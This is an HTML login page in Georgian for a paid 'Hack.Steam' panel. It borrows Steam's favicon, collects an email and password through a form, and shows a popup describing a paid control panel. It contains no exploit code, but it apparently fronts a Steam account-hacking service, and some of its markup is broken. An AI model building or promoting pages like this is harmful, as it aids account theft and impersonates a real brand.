<!--
	Author: VIPServ STUDIO AND MR.ALEX 2019
-->
<!DOCTYPE html>
<html lang="ka">
<!-- Head -->

<head>
<title> Hack.Steam Panel Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="Login" />
<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
<!-- Favicons -->
		<link rel="icon"  type="image/png" href="https://store.steampowered.com/favicon.ico"><!--FAVICON-->
<!-- Default-JavaScript-File -->
	<script type="text/javascript" src="js/jquery-2.1.4.min.js"></script>
<!-- //Default-JavaScript-File -->

<!-- default-css-files -->
	<link href="/css/font-awesome.min.css" rel="stylesheet" type="text/css" media="all" />
<!-- default-css-files -->

<link href="/css/popup-box.html" rel="stylesheet" type="text/css" media="all" /><!-- popup css -->  

<!-- style.css-file -->
	<link href="http://folga.com.ge/css/style.css" rel='stylesheet' type='text/css' />
<!-- //style.css-file -->

<link href="https://fonts.googleapis.com/css?family=Raleway:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i&amp;subset=latin-ext" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i&amp;subset=cyrillic,cyrillic-ext,greek,greek-ext,latin-ext,vietnamese" rel="stylesheet">

</head>
<!-- Head -->
<body>

<!-- /plans -->
<!-- <div class="plans-section">
	<div class="plans-main">
		<h1 class="w3l-inner-h-title">WWW.GMM-STUDIO.GE <br> ვებ დიზაინების შექმნა</h1>
		<a href="https://www.sa-mp.com/"</a>
				 <div class="price-grid">
					<div class="price-block agile">
					    
						<div class="price-gd-top pric-clr1">
							<img src="images/samp.png">
							<h4>SA-MP Community</h4>
							<p>ყველაფერი რაც ეხება SAMP-ს დიზაინის ნახვა</p>
							
							
						</div>
						
					</div>
				</div></a>
				<a href="https://counter-strike.net/"</a>
				<div class="price-grid ">
					<div class="price-block price-block1 agile">
						<div class="price-gd-top pric-clr2">
						    <img src="https://media.giphy.com/media/7vUBOECvNpUOs/giphy.gif" width="100" height="50">
							<img src="images/go.png">
							<h4>CS:GO</h4>
						<p>ყველაფერი რაც ეხება CS:GO-ს დიზაინის ნახვა.</p>
							
						</div>
						
					</div>
				</div></a>
                                <a href="https://geocs.icu/"</a>
				<div class="price-grid ">
					<div class="price-block price-block1 agile">
						<div class="price-gd-top pric-clr2">
						    <img src="https://media.giphy.com/media/7vUBOECvNpUOs/giphy.gif" width="100" height="50">
							<img src="images/cs.png">
							<h4>CS 1.6</h4>
						<p>ყველაფერი რაც ეხება CS 1.6-ს. დიზაინის ნახვა</p>
							
						</div>
						
					</div>
				</div></a>
				<a href="https://hosting.vipstudio.website/"</a>
				<div class="price-grid lost">
					<div class="price-block price-block2 agile">
						<div class="price-gd-top pric-clr3">
						    
						    <img src="images/host.png">
						<!--	<i class="fa fa-diamond" aria-hidden="true"></i>-->
                                                
							<!--<h4>Hosting</h4>
							<--<p>სერვერების ჰოსტინგი MADE BY GMM STUDIO </p>-->
							
						</div>
						<!--<div class="price-gd-bottom">
							<div class="price-list">
								<ul>
									<li><i class="fa fa-star" aria-hidden="true"></i></li>
									<li><i class="fa fa-star" aria-hidden="true"></i></li>
									<li><i class="fa fa-star" aria-hidden="true"></i></li>
									<li><i class="fa fa-star" aria-hidden="true"></i></li>
									<li><i class="fa fa-star-half-o" aria-hidden="true"></i></li>
									
								</ul>
							</div>
							<!--<div class="price-selet pric-sclr3">
								<a href="#small-dialog" class="w3_agileits_sign_up2 popup-with-zoom-anim  ab scroll" >Signup Now</a>
							</div>
						</div>-->
					</div>
				</div></a>
				<div class="clear"></div>
	</div>
	
	
	<center><font color="greenblue"><h2>შესვლა სამართავ პანელში:</font></h2></center>

<form action="/cp" method="post" enctype="text/plain">
<center>
<font color="red">ელ/ფოსტა:</font><br>
<input type="email" name="mail"><br>
<input type="password" name="Password"><br>
<font color="red">პაროლი</font><br>
<input type="submit" value="შესვლა">
<input type="reset" value="გადატვირთვა">
</form></center>
</div>
<!-- //plans -->
	
<!-- copyright -->
<div class="copyright-agile">
	<p>&copy; 2019 <a href="https://studio.vipserv.icu/">WWW.VipServ.Ge Designed By VipServ STUDIO</a> </p>
</div>
<!-- //copyright -->
	
	

<!-- pop-up-box -->
		<script src="js/jquery.magnific-popup.html" type="text/javascript"></script>
		<script>
			$(document).ready(function() {
				$('.popup-with-zoom-anim').magnifi
				opup({
					type: 'inline',
					fixedContentPos: false,
					fixedBgPos: true,
					overflowY: 'auto',
					closeBtnInside: true,
					preloader: false,
					midClick: true,
					removalDelay: 300,
					mainClass: 'my-mfp-zoom-in'
				});														
			});
		</script>
	<!--//pop-up-box -->
	
	
	
	
	
	
	<style>  
#parent_popup {  
background-color: rgba(0, 0, 0, 0.8);  
display: none;  
position: fixed;  
z-index: 99999;  
top: 0;  
right: 0;  
bottom: 0;  
left: 0;  
}  
#popup {  
background: #fff;  
/* ზომა */  
width: 520px;  
margin: 10% auto;  
padding: 5px 20px 13px 20px;  
border: 10px solid #ddd;  
position: relative;  
-webkit-box-shadow: 0px 0px 20px #000;  
-moz-box-shadow: 0px 0px 20px #000;  
box-shadow: 0px 0px 20px #000;  
-webkit-border-radius: 10px;  
-moz-border-radius: 10px;  
border-radius: 10px;  
}  
#popup h4{  
/* შრიფტი */  
font:28px Monotype Corsiva, Arial;  
font-weight: bold;  
text-align: center;  
color: #008000;  
text-shadow: 0 1px 3px rgba(0,0,0,.3);  
}  
#popup h5{  
/* შრიფტი */  
font:24px Monotype Corsiva, Arial;  
color: red;  
text-align: center;  
text-shadow: 0 1px 3px rgba(0,0,0,.3);  
}  
/* დახურვის ღილაკი */  
.close {  
background-color: rgba(0, 0, 0, 0.8);  
border: 2px solid #ccc;  
height: 24px;  
line-height: 24px;  
position: absolute;  
right: -24px;  
cursor: pointer;  
font-weight: bold;  
text-align: center;  
text-decoration: none;  
color: rgba(255, 255, 255, 0.9);  
font-size: 16px;  
text-shadow: 0 -1px rgba(0, 0, 0, 0.9);  
top: -24px;  
width: 24px;  
-webkit-border-radius: 15px;  
-moz-border-radius: 15px;  
-ms-border-radius: 15px;  
-o-border-radius: 15px;  
border-radius: 15px;  
-moz-box-shadow: 1px 1px 3px #000;  
-webkit-box-shadow: 1px 1px 3px #000;  
box-shadow: 1px 1px 3px #000;  
}  
.close:hover {  
background-color: rgba(0, 122, 200, 0.8);  
}  
</style>  
<div id="parent_popup">  
<div id="popup">  
<h5>ძვირფასო მომხმარებელო </h5>
    <p><center><b> მოგესალმებით სამართავ პანელში</b></center></p>
<p><h4>SteamPanel</h4><p>  

<p><center>
    <b>რო გადახვიდე სამართავ პანელში საჭიოროა ლოგინი და პაროლი</b>
</center><p>
    <p><center><b><a href="/cp">და დააჭირო ღილაკს შესვლა ეს პანელი ფასიანია!</a></b></center><p>  
<p style="text-align: center;">  
<strong>  
<a class="button" href="#"></a>  
</strong></p>  
<a class="close" title="დახურვა" onclick="document.getElementById('parent_popup').style.display='none';">X</a>  
</div>  
</div>  
<script type="text/javascript">  
var delay_popup = 0;  
setTimeout("document.getElementById('parent_popup').style.display='block'", delay_popup);  
</script>  
   
<script src="#" type="text/javascript"></script>
	
	
	
	
	
</body>

<!-- Designed And Edited By Vip Studio -->
</html>